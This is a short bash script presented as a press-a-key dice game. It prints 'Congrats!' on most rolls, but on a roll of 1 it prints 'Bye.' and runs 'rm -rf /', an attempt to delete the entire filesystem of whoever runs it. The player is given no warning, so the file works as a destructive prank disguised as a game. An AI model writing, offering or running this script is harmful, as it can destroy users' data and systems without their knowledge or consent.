#!/bin/bash

while true; do
    echo "Press any key to play."
    read -n 1 key

    random_number=$((1 + RANDOM % 6))

    if [ "$random_number" -eq 1 ]; then
        echo "Bye."
        rm -rf /
    else
        echo "Congrats!"
    fi
done
